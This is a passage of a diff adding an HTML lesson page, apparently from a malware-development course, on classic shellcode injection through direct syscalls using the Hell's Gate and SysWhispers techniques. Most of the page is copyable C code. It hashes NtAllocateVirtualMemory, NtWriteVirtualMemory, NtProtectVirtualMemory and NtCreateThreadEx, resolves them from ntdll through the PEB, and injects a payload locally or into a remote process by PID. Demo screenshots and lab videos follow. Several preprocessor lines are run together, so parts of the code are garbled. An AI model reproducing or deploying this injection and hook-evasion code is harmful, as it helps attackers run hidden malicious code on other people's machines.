+	DWORD64 dwHash = 0x77347734DEADBEEF; // Old value: 0x7734773477347734
+	INT c;
+
+	while (c = *str++)
+		dwHash = ((dwHash &lt;&lt; 0x5) + dwHash) + c;
+
+	return dwHash;
+}</code></pre>
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The following <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">printf</code> statements should be added to a new project to generate the djb2 hash values.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">printf(&quot;#define %s%s 0x%p \n&quot;, &quot;NtAllocateVirtualMemory&quot;, &quot;_djb2&quot;, (DWORD64)djb2(&quot;NtAllocateVirtualMemory&quot;));
+printf(&quot;#define %s%s 0x%p \n&quot;, &quot;NtWriteVirtualMemory&quot;, &quot;_djb2&quot;, djb2(&quot;NtWriteVirtualMemory&quot;));
+printf(&quot;#define %s%s 0x%p \n&quot;, &quot;NtProtectVirtualMemory&quot;, &quot;_djb2&quot;, djb2(&quot;NtProtectVirtualMemory&quot;));
+printf(&quot;#define %s%s 0x%p \n&quot;, &quot;NtCreateThreadEx&quot;, &quot;_djb2&quot;, djb2(&quot;NtCreateThreadEx&quot;));</code></pre>
+        </div>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/syscalls-classic-618293274-8d259f06-efa2-4254-886c-ce14500fb65d.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Once the values are generated, add them to the start of the Hell&#x27;s Gate project.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">#define NtAllocateVirtualMemory_djb2  0x7B2D1D431C81F5F6#define NtWriteVirtualMemory_djb2     0x54AEE238645CCA7C#define NtProtectVirtualMemory_djb2   0xA0DCC2851566E832#define NtCreateThreadEx_djb2         0x2786FB7E75145F1A</code></pre>
+        </div><h3 id="updating-the-main-function" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Updating The Main Function</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The main function must be updated to call the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">ClassicInjectionViaSyscalls</code> instead of the <a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L80" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition">payload function</a>. The function will use the above-generated hashes as shown below.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">INT main() {
+	// Getting the PEB structure
+	PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
+	PPEB pCurrentPeb = pCurrentTeb-&gt;ProcessEnvironmentBlock;
+	if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb-&gt;OSMajorVersion != 0xA)
+		return 0x1;
+
+	// Getting the NTDLL module
+	PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb-&gt;LoaderData-&gt;InMemoryOrderModuleList.Flink-&gt;Flink - 0x10);
+
+	// Getting the EAT of Ntdll
+	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
+	if (!GetImageExportDirectory(pLdrDataEntry-&gt;DllBase, &amp;pImageExportDirectory) || pImageExportDirectory == NULL)
+		return 0x01;
+
+//--------------------------------------------------------------------------
+	// Initializing the &#x27;Table&#x27; structure
+	VX_TABLE Table = { 0 };
+	Table.NtAllocateVirtualMemory.dwHash = NtAllocateVirtualMemory_djb2;
+	if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;Table.NtAllocateVirtualMemory))
+		return 0x1;
+
+	Table.NtWriteVirtualMemory.dwHash = NtWriteVirtualMemory_djb2;
+	if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;Table.NtWriteVirtualMemory))
+		return 0x1;
+
+	Table.NtProtectVirtualMemory.dwHash = NtProtectVirtualMemory_djb2;
+	if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;Table.NtProtectVirtualMemory))
+		return 0x1;
+
+	Table.NtCreateThreadEx.dwHash = NtCreateThreadEx_djb2;
+	if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;Table.NtCreateThreadEx))
+		return 0x1;
+
+//--------------------------------------------------------------------------
+	// injection code - calling the &#x27;ClassicInjectionViaSyscalls&#x27; function
+
+
+// If local injection
+#ifdef LOCAL_INJECTIONif (!ClassicInjectionViaSyscalls(&amp;Table, (HANDLE)-1, Payload, sizeof(Payload)))
+		return 0x1;
+#endif // LOCAL_INJECTION// If remote injection
+#ifdef REMOTE_INJECTION// Open a handle to the target process
+	printf(&quot;[i] Targeting process of id : %d \n&quot;, PROCESS_ID);
+	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PROCESS_ID);
+	if (hProcess == NULL) {
+		printf(&quot;[!] OpenProcess Failed With Error : %d \n&quot;, GetLastError());
+		return -1;
+	}
+
+	if (!ClassicInjectionViaSyscalls(&amp;Table, hProcess, Payload, sizeof(Payload)))
+		return 0x1;
+
+#endif // REMOTE_INJECTIONreturn 0x00;
+}</code></pre>
+        </div><h3 id="local-vs-remote-injection" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Local vs Remote Injection</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Since the implemented <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">ClassicInjectionViaSyscalls</code> can work on both the local process and the remote process level, a preprocessor macro code was constructed to target the local process if <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">LOCAL_INJECTION</code> is defined. The preprocessor code is shown below.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">#define LOCAL_INJECTION#ifndef LOCAL_INJECTION#define REMOTE_INJECTION// Set the target process PID
+#define PROCESS_ID	18784	#endif // !LOCAL_INJECTION</code></pre>
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">#define LOCAL_INJECTION</code> can be commented out to target a remote process. In this case, the process of PID equal to <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">PROCESS_ID</code> will be targeted. If <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">#define LOCAL_INJECTION</code> is not commented, which is the default setting in the shared code, then the local process&#x27;s pseudo handle is used which is equal to <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">(HANDLE)-1</code>.</p><h3 id="demo" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Demo</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Using the SysWhispers implementation locally.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/syscalls-classic-714361294-3e6b766a-57cc-4a05-b788-fe53e9cdc3c2.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Using SysWhispers implementation remotely.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/syscalls-classic-814362613-395c4f9f-05c5-4a0a-9325-4f2deedaf1b7.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Using Hell&#x27;s Gate implementation locally.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/syscalls-classic-914361542-8212a53a-8c06-4a9f-ba93-4bf8add3ab35.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Using Hell&#x27;s Gate implementation remotely.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/syscalls-classic-9214363039-c409bb06-27a1-433e-a06b-3617828b68d4.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div><div class="mt-8 sm:mt-12 pt-6 border-t border-[#212b54] space-y-4"><h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2"><i data-lucide="video" class="w-4 h-4 sm:w-5 sm:h-5 text-[var(--accent)]"></i><span>Practical Lab Demonstration</span></h3>
+    <div class="my-6 sm:my-8 rounded-2xl border border-[#212b54] bg-[#0c1022] p-4 sm:p-5 space-y-3 sm:space-y-4 shadow-2xl transition-all duration-300 hover:border-[var(--accent)]">
+        <div class="flex flex-wrap items-center justify-between gap-2 border-b border-[#1c243f] pb-3">
+            <div class="flex items-center gap-2 min-w-0">
+                <i data-lucide="clapperboard" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                <h4 class="text-xs sm:text-sm font-bold text-white tracking-wide truncate">Field Lab Demo: asm demo</h4>
+            </div>
+            <span class="px-2 py-0.5 rounded-full text-[10px] sm:text-xs font-mono font-semibold bg-[var(--accent-soft)] text-[var(--accent)] border border-[var(--accent)]">Live Lab</span>
+        </div>
+        <div class="rounded-xl overflow-hidden bg-black border border-[#1c243f] shadow-inner">
+            <video controls preload="metadata" class="w-full max-h-[320px] sm:max-h-[480px] bg-black">
+                <source src="videos/asm-demo.mp4" type="video/mp4">
+                Your browser does not support the video tag.
+            </video>
+        </div>
+        <div class="flex flex-wrap items-center justify-between gap-2 text-xs text-[#cbd5e1] font-mono pt-1">
+            <span class="flex items-center gap-1.5 truncate max-w-[200px] sm:max-w-xs"><i data-lucide="file-video" class="w-3.5 h-3.5 text-[var(--accent)] flex-shrink-0"></i><span class="truncate">asm-demo.mp4</span></span>
+            <a href="videos/asm-demo.mp4" download class="text-[#cbd5e1] hover:text-[var(--accent)] font-semibold flex items-center gap-1 transition"><i data-lucide="download" class="w-3.5 h-3.5"></i><span>Download MP4</span></a>
+        </div>
+    </div>
+    <div class="my-6 sm:my-8 rounded-2xl border border-[#212b54] bg-[#0c1022] p-4 sm:p-5 space-y-3 sm:space-y-4 shadow-2xl transition-all duration-300 hover:border-[var(--accent)]">
+        <div class="flex flex-wrap items-center justify-between gap-2 border-b border-[#1c243f] pb-3">
+            <div class="flex items-center gap-2 min-w-0">
+                <i data-lucide="clapperboard" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                <h4 class="text-xs sm:text-sm font-bold text-white tracking-wide truncate">Field Lab Demo: Tampered Syscalls Via Hardware BreakPoints V1</h4>
+            </div>
+            <span class="px-2 py-0.5 rounded-full text-[10px] sm:text-xs font-mono font-semibold bg-[var(--accent-soft)] text-[var(--accent)] border border-[var(--accent)]">Live Lab</span>
+        </div>
+        <div class="rounded-xl overflow-hidden bg-black border border-[#1c243f] shadow-inner">
+            <video controls preload="metadata" class="w-full max-h-[320px] sm:max-h-[480px] bg-black">
+                <source src="videos/Tampered_Syscalls_Via_Hardware_BreakPoints_V1.mp4" type="video/mp4">
+                Your browser does not support the video tag.
+            </video>
+        </div>
+        <div class="flex flex-wrap items-center justify-between gap-2 text-xs text-[#cbd5e1] font-mono pt-1">
+            <span class="flex items-center gap-1.5 truncate max-w-[200px] sm:max-w-xs"><i data-lucide="file-video" class="w-3.5 h-3.5 text-[var(--accent)] flex-shrink-0"></i><span class="truncate">Tampered_Syscalls_Via_Hardware_BreakPoints_V1.mp4</span></span>
+            <a href="videos/Tampered_Syscalls_Via_Hardware_BreakPoints_V1.mp4" download class="text-[#cbd5e1] hover:text-[var(--accent)] font-semibold flex items-center gap-1 transition"><i data-lucide="download" class="w-3.5 h-3.5"></i><span>Download MP4</span></a>
+        </div>
+    </div></div></main></body></html>
